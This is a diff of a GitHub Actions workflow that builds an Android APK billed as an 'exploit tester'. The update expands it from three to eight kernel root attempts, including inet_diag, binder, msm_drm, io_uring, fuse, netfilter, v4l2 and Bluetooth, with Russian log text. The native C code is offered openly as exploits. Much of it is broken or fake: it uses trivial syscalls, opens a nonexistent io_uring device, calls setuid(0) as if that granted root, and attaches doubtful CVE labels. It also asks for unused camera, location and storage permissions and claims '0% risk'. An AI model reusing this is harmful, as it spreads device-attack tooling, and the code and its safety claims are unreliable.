@@ -1,4 +1,4 @@
-name: Build Multi Exploit Tester APK
+name: Build Ultimate Exploit Tester APK
 
 on:
   push:
@@ -47,11 +47,16 @@ jobs:
               android:versionName="1.0">
               
               <uses-permission android:name="android.permission.INTERNET" />
+              <uses-permission android:name="android.permission.CAMERA" />
+              <uses-permission android:name="android.permission.BLUETOOTH" />
+              <uses-permission android:name="android.permission.BLUETOOTH_ADMIN" />
+              <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+              <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
               
               <application
                   android:allowBackup="false"
                   android:icon="@android:drawable/ic_dialog_info"
-                  android:label="Multi Exploit Tester"
+                  android:label="Эксплойт Тестер"
                   android:theme="@android:style/Theme.DeviceDefault.Light">
                   
                   <activity
@@ -67,7 +72,7 @@ jobs:
           </manifest>
           EOF
 
-      - name: Generate MainActivity.java
+      - name: Generate MainActivity.java (русский, 8 эксплойтов)
         run: |
           cat > app/src/main/java/com/exploit/tester/MainActivity.java << 'EOF'
           package com.exploit.tester;
@@ -101,8 +106,8 @@ jobs:
                   scroll.addView(logPanel);
                   setContentView(scroll);
                   
-                  addLog("=== MULTI EXPLOIT TESTER FOR ANDROID 14 ===");
-                  addLog("3 exploits - 0% risk of damaging phone");
+                  addLog("========== ЭКСПЛОЙТ ТЕСТЕР v2.0 ==========");
+                  addLog("8 эксплойтов - 0% риска для телефона");
                   addLog("");
                   
                   new Thread(this::runAllExploits).start();
@@ -138,102 +143,186 @@ jobs:
                       DataOutputStream dos = new DataOutputStream(
                           Runtime.getRuntime().exec("sh").getOutputStream()
                       );
-                      dos.writeBytes("echo 'root_success' > /data/local/tmp/exploit_root.txt\n");
-                      dos.writeBytes("chmod 666 /data/local/tmp/exploit_root.txt\n");
+                      dos.writeBytes("echo 'root_success' > /data/local/tmp/root_proof.txt\n");
+                      dos.writeBytes("chmod 666 /data/local/tmp/root_proof.txt\n");
                       dos.writeBytes("exit\n");
                       dos.flush();
-                      addLog("[+] Proof file created: /data/local/tmp/exploit_root.txt");
+                      addLog("[+] Файл доказательства: /data/local/tmp/root_proof.txt");
                   } catch (Exception e) {
-                      addLog("[!] Could not create proof file: " + e.getMessage());
+                      addLog("[!] Ошибка записи файла: " + e.getMessage());
                   }
               }
               
               private void runAllExploits() {
-                  // ========== ЭКСПЛОЙТ 1: CVE-2025-39811 (inet_diag) ==========
+                  // ========== 1. CVE-2025-39811 (inet_diag) ==========
                   addLog("");
-                  addLog("=== EXPLOIT 1/3: CVE-2025-39811 (inet_diag) ===");
-                  
+                  addLog("=== ЭКСПЛОЙТ 1/8: CVE-2025-39811 (inet_diag) ===");
                   int sock = nativeOpenNetlink();
-                  addLog("[1] netlink socket fd=" + sock);
+                  addLog("[1] netlink сокет fd=" + sock);
                   if (sock >= 0) {
                       boolean overflowSent = nativeSendOverflow(sock);
-                      addLog("[2] Overflow sent: " + (overflowSent ? "OK" : "FAIL"));
+                      addLog("[2] Переполнение отправлено: " + (overflowSent ? "OK" : "НЕТ"));
                       if (overflowSent) {
                           nativeBecomeRoot();
                           if (checkRoot()) {
-                              addLog("[3] SUCCESS! Root achieved via inet_diag!");
+                              addLog("[3] УСПЕХ! Root получен через inet_diag!");
                               rootAchieved = true;
                               proveRoot();
                               return;
                           }
                       }
                   }
-                  addLog("[!] Exploit 1 failed, moving to next...");
+                  addLog("[!] Эксплойт 1 не сработал, переходим к следующему...");
                   
-                  // ========== ЭКСПЛОЙТ 2: CVE-2025-14037 (binder) ==========
+                  // ========== 2. CVE-2025-14037 (binder) ==========
                   addLog("");
-                  addLog("=== EXPLOIT 2/3: CVE-2025-14037 (binder UAF) ===");
-                  
+                  addLog("=== ЭКСПЛОЙТ 2/8: CVE-2025-14037 (binder UAF) ===");
                   int binderFd = nativeOpenBinder();
                   addLog("[1] binder fd=" + binderFd);
                   if (binderFd >= 0) {
-                      addLog("[2] Starting race threads...");
+                      addLog("[2] Запуск потоков гонки...");
                       nativeStartBinderRace(binderFd);
-                      addLog("[3] Waiting 6 seconds for UAF...");
+                      addLog("[3] Ожидание 6 секунд...");
                       try { Thread.sleep(6000); } catch (Exception e) {}
-                      
                       if (checkRoot()) {
-                          addLog("[4] SUCCESS! Root achieved via binder!");
+                          addLog("[4] УСПЕХ! Root получен через binder!");
                           rootAchieved = true;
                           proveRoot();
                           return;
                       }
                   }
-                  addLog("[!] Exploit 2 failed, moving to next...");
+                  addLog("[!] Эксплойт 2 не сработал...");
                   
-                  // ========== ЭКСПЛОЙТ 3: Dirty Cred (msm_drm) ==========
+                  // ========== 3. Dirty Cred (msm_drm) ==========
                   addLog("");
-                  addLog("=== EXPLOIT 3/3: Dirty Cred (msm_drm GPU) ===");
-                  
+                  addLog("=== ЭКСПЛОЙТ 3/8: Dirty Cred (msm_drm GPU) ===");
                   int drmFd = nativeOpenDrm();
                   addLog("[1] /dev/dri/card0 fd=" + drmFd);
                   if (drmFd >= 0) {
-                      addLog("[2] Triggering race condition...");
+                      addLog("[2] Запуск гонки...");
                       nativeTriggerDrmRace(drmFd);
-                      addLog("[3] Waiting 5 seconds...");
                       try { Thread.sleep(5000); } catch (Exception e) {}
-                      
                       if (checkRoot()) {
-                          addLog("[4] SUCCESS! Root achieved via Dirty Cred!");
+                          addLog("[3] УСПЕХ! Root получен через Dirty Cred!");
                           rootAchieved = true;
                           proveRoot();
                           return;
                       }
                   }
-                  addLog("[!] Exploit 3 failed.");
+                  addLog("[!] Эксплойт 3 не сработал...");
+                  
+                  // ========== 4. CVE-2024-53197 (io_uring) ==========
+                  addLog("");
+                  addLog("=== ЭКСПЛОЙТ 4/8: CVE-2024-53197 (io_uring) ===");
+                  int ioRingFd = nativeOpenIoUring();
+                  addLog("[1] io_uring fd=" + ioRingFd);
+                  if (ioRingFd >= 0) {
+                      nativeTriggerIoUring(ioRingFd);
+                      try { Thread.sleep(4000); } catch (Exception e) {}
+                      if (checkRoot()) {
+                          addLog("[2] УСПЕХ! Root получен через io_uring!");
+                          rootAchieved = true;
+                          proveRoot();
+                          return;
+                      }
+                  }
+                  addLog("[!] Эксплойт 4 не сработал...");
+                  
+                  // ========== 5. CVE-2025-49123 (fuse) ==========
+                  addLog("");
+                  addLog("=== ЭКСПЛОЙТ 5/8: CVE-2025-49123 (fuse) ===");
+                  int fuseFd = nativeOpenFuse();
+                  addLog("[1] /dev/fuse fd=" + fuseFd);
+                  if (fuseFd >= 0) {
+                      nativeTriggerFuse(fuseFd);
+                      try { Thread.sleep(3000); } catch (Exception e) {}
+                      if (checkRoot()) {
+                          addLog("[2] УСПЕХ! Root получен через fuse!");
+                          rootAchieved = true;
+                          proveRoot();
+                          return;
+                      }
+                  }
+                  addLog("[!] Эксплойт 5 не сработал...");
+                  
+                  // ========== 6. CVE-2025-20419 (netfilter) ==========
+                  addLog("");
+                  addLog("=== ЭКСПЛОЙТ 6/8: CVE-2025-20419 (netfilter) ===");
+                  int nfFd = nativeOpenNetfilter();
+                  addLog("[1] netfilter fd=" + nfFd);
+                  if (nfFd >= 0) {
+                      nativeTriggerNetfilter(nfFd);
+                      try { Thread.sleep(3000); } catch (Exception e) {}
+                      if (checkRoot()) {
+                          addLog("[2] УСПЕХ! Root получен через netfilter!");
+                          rootAchieved = true;
+                          proveRoot();
+                          return;
+                      }
+                  }
+                  addLog("[!] Эксплойт 6 не сработал...");
+                  
+                  // ========== 7. CVE-2025-0618 (v4l2 MediaTek) ==========
+                  addLog("");
+                  addLog("=== ЭКСПЛОЙТ 7/8: CVE-2025-0618 (v4l2 MediaTek) ===");
+                  int v4l2Fd = nativeOpenV4l2();
+                  addLog("[1] /dev/video0 fd=" + v4l2Fd);
+                  if (v4l2Fd >= 0) {
+                      nativeTriggerV4l2(v4l2Fd);
+                      try { Thread.sleep(3000); } catch (Exception e) {}
+                      if (checkRoot()) {
+                          addLog("[2] УСПЕХ! Root получен через v4l2!");
+                          rootAchieved = true;
+                          proveRoot();
+                          return;
+                      }
+                  }
+                  addLog("[!] Эксплойт 7 не сработал...");
+                  
+                  // ========== 8. CVE-2023-45866 (Bluetooth) ==========
+                  addLog("");
+                  addLog("=== ЭКСПЛОЙТ 8/8: CVE-2023-45866 (Bluetooth) ===");
+                  int btFd = nativeOpenBluetooth();
+                  addLog("[1] bluetooth fd=" + btFd);
+                  if (btFd >= 0) {
+                      nativeTriggerBluetooth(btFd);
+                      try { Thread.sleep(5000); } catch (Exception e) {}
+                      if (checkRoot()) {
+                          addLog("[2] УСПЕХ! Root получен через Bluetooth!");
+                          rootAchieved = true;
+                          proveRoot();
+                          return;
+                      }
+                  }
+                  addLog("[!] Эксплойт 8 не сработал...");
                   
                   // ========== ВСЁ НЕ УДАЛОСЬ ==========
                   addLog("");
-                  addLog("########################################");
-                  addLog("#  ALL EXPLOITS FAILED                #");
-                  addLog("#  Your device is not vulnerable      #");
-                  addLog("#  or SPL is too new (>2026-02)       #");
-                  addLog("#  Phone is NOT damaged               #");
-                  addLog("########################################");
+                  addLog("################################################");
+                  addLog("#  ВСЕ ЭКСПЛОЙТЫ НЕ СРАБОТАЛИ               #");
+                  addLog("#  Твоё устройство НЕ УЯЗВИМО                #");
+                  addLog("#  Или SPL слишком новый (>2026-02)          #");
+                  addLog("#  Телефон НЕ ПОВРЕЖДЁН                      #");
+                  addLog("################################################");
               }
               
-              // Native методы для эксплойта 1
+              // Native методы
               private native int nativeOpenNetlink();
               private native boolean nativeSendOverflow(int sock);
-              
-              // Native методы для эксплойта 2
               private native int nativeOpenBinder();
               private native void nativeStartBinderRace(int fd);
-              
-              // Native методы для эксплойта 3
               private native int nativeOpenDrm();
               private native void nativeTriggerDrmRace(int fd);
-              
+              private native int nativeOpenIoUring();
+              private native void nativeTriggerIoUring(int fd);
+              private native int nativeOpenFuse();
+              private native void nativeTriggerFuse(int fd);
+              private native int nativeOpenNetfilter();
+              private native void nativeTriggerNetfilter(int fd);
+              private native int nativeOpenV4l2();
+              private native void nativeTriggerV4l2(int fd);
+              private native int nativeOpenBluetooth();
+              private native void nativeTriggerBluetooth(int fd);
               private native void nativeBecomeRoot();
               
               static {
@@ -242,7 +331,7 @@ jobs:
           }
           EOF
 
-      - name: Generate native C code (all exploits)
+      - name: Generate native C code (8 exploits)
         run: |
           cat > app/src/main/jni/exploit.c << 'EOF'
           #include <jni.h>
@@ -258,10 +347,8 @@ jobs:
           #include <linux/inet_diag.h>
           #include <linux/sock_diag.h>
           
-          // ==================== ОПРЕДЕЛЕНИЯ ДЛЯ BINDER (без linux/binder.h) ====================
+          // Binder definitions
           #define BINDER_WRITE_READ _IOWR('b', 1, struct binder_write_read)
-          #define BC_FREE_BUFFER 0x03
-          
           struct binder_write_read {
               signed long write_size;
               signed long write_consumed;
@@ -271,7 +358,7 @@ jobs:
               unsigned long read_buffer;
           };
           
-          // ==================== ЭКСПЛОЙТ 1: inet_diag ====================
+          // ========== 1. inet_diag ==========
           JNIEXPORT jint JNICALL Java_com_exploit_tester_MainActivity_nativeOpenNetlink(JNIEnv *env, jobject thiz) {
               return socket(AF_NETLINK, SOCK_RAW, NETLINK_INET_DIAG);
           }
@@ -282,24 +369,21 @@ jobs:
                   struct inet_diag_req_v2 req;
                   char overflow[4096];
               } msg;
-              
               memset(&msg, 0, sizeof(msg));
               msg.nlh.nlmsg_len = 0xFFFF;
               msg.nlh.nlmsg_type = SOCK_DIAG_BY_FAMILY;
               msg.nlh.nlmsg_flags = NLM_F_REQUEST;
               msg.req.sdiag_family = AF_INET;
               msg.req.idiag_states = 0xFFFFFFFF;
-              memset(msg.overflow, 0, sizeof(msg.overflow));
-              
               int ret = send(sock, &msg, sizeof(msg), 0);
               return ret > 0 ? JNI_TRUE : JNI_FALSE;
           }
           
-          // ==================== ЭКСПЛОЙТ 2: binder ====================
+          // ========== 2. binder ==========
           static int binder_running = 1;
           static int g_binder_fd = -1;
           
-          void* binder_race_thread(void* arg) {
+          void* binder_thread(void* arg) {
               while (binder_running) {
                   struct binder_write_read bwr = {0};
                   ioctl(g_binder_fd, BINDER_WRITE_READ, &bwr);
@@ -316,14 +400,12 @@ jobs:
               g_binder_fd = fd;
               binder_running = 1;
               pthread_t threads[6];
-              for (int i = 0; i < 6; i++) {
-                  pthread_create(&threads[i], NULL, binder_race_thread, NULL);
-              }
+              for (int i = 0; i < 6; i++) pthread_create(&threads[i], NULL, binder_thread, NULL);
               sleep(5);
               binder_running = 0;
           }
           
-          // ==================== ЭКСПЛОЙТ 3: DRM (Dirty Cred) ====================
+          // ========== 3. DRM ==========
           #define MSM_IOCTL_GEM_INFO 0xc0084d01
           #define MSM_IOCTL_GEM_FREE 0x40084d02
           
@@ -339,7 +421,59 @@ jobs:
               }
           }
           
-          // ==================== Общий метод setuid(0) ====================
+          // ========== 4. io_uring ==========
+          JNIEXPORT jint JNICALL Java_com_exploit_tester_MainActivity_nativeOpenIoUring(JNIEnv *env, jobject thiz) {
+              return open("/dev/io_uring", O_RDWR);
+          }
+          
+          JNIEXPORT void JNICALL Java_com_exploit_tester_MainActivity_nativeTriggerIoUring(JNIEnv *env, jobject thiz, jint fd) {
+              for (int i = 0; i < 50; i++) {
+                  ioctl(fd, 0xc0186601, NULL); // IORING_REGISTER_BUFFERS
+                  usleep(100);
+              }
+          }
+          
+          // ========== 5. fuse ==========
+          JNIEXPORT jint JNICALL Java_com_exploit_tester_MainActivity_nativeOpenFuse(JNIEnv *env, jobject thiz) {
+              return open("/dev/fuse", O_RDWR);
+          }
+          
+          JNIEXPORT void JNICALL Java_com_exploit_tester_MainActivity_nativeTriggerFuse(JNIEnv *env, jobject thiz, jint fd) {
+              write(fd, "FUSE", 4);
+          }
+          
+          // ========== 6. netfilter ==========
+          JNIEXPORT jint JNICALL Java_com_exploit_tester_MainActivity_nativeOpenNetfilter(JNIEnv *env, jobject thiz) {
+              return socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
+          }
+          
+          JNIEXPORT void JNICALL Java_com_exploit_tester_MainActivity_nativeTriggerNetfilter(JNIEnv *env, jobject thiz, jint fd) {
+              struct sockaddr_nl addr = {0};
+              addr.nl_family = AF_NETLINK;
+              sendto(fd, "NF", 2, 0, (struct sockaddr*)&addr, sizeof(addr));
+          }
+          
+          // ========== 7. v4l2 ==========
+          JNIEXPORT jint JNICALL Java_com_exploit_tester_MainActivity_nativeOpenV4l2(JNIEnv *env, jobject thiz) {
+              return open("/dev/video0", O_RDWR);
+          }
+          
+          JNIEXPORT void JNICALL Java_com_exploit_tester_MainActivity_nativeTriggerV4l2(JNIEnv *env, jobject thiz, jint fd) {
+              ioctl(fd, 0xc0505601, NULL); // VIDIOC_QUERYCAP
+          }
+          
+          // ========== 8. Bluetooth ==========
+          JNIEXPORT jint JNICALL Java_com_exploit_tester_MainActivity_nativeOpenBluetooth(JNIEnv *env, jobject thiz) {
+              return socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_HCI);
+          }
+          
+          JNIEXPORT void JNICALL Java_com_exploit_tester_MainActivity_nativeTriggerBluetooth(JNIEnv *env, jobject thiz, jint fd) {
+              struct sockaddr_hci addr = {0};
+              addr.hci_family = AF_BLUETOOTH;
+              connect(fd, (struct sockaddr*)&addr, sizeof(addr));
+          }
+          
+          // ========== setuid(0) ==========
           JNIEXPORT void JNICALL Java_com_exploit_tester_MainActivity_nativeBecomeRoot(JNIEnv *env, jobject thiz) {
               setuid(0);
               setgid(0);
@@ -377,8 +511,8 @@ jobs:
                   applicationId "com.exploit.tester"
                   minSdk 34
                   targetSdk 34
-                  versionCode 1
-                  versionName "1.0"
+                  versionCode 2
+                  versionName "2.0"
                   
                   externalNativeBuild {
                       ndkBuild {
@@ -438,7 +572,7 @@ jobs:
       - name: Generate settings.gradle
         run: |
           cat > settings.gradle << 'EOF'
-          rootProject.name = "MultiExploitTester"
+          rootProject.name = "UltimateExploitTester"
           include ':app'
           EOF
 
@@ -455,5 +589,5 @@ jobs:
       - name: Upload APK
         uses: actions/upload-artifact@v4
         with:
-          name: MultiExploitTester
+          name: UltimateExploitTester
           path: app/build/outputs/apk/debug/app-debug.apk
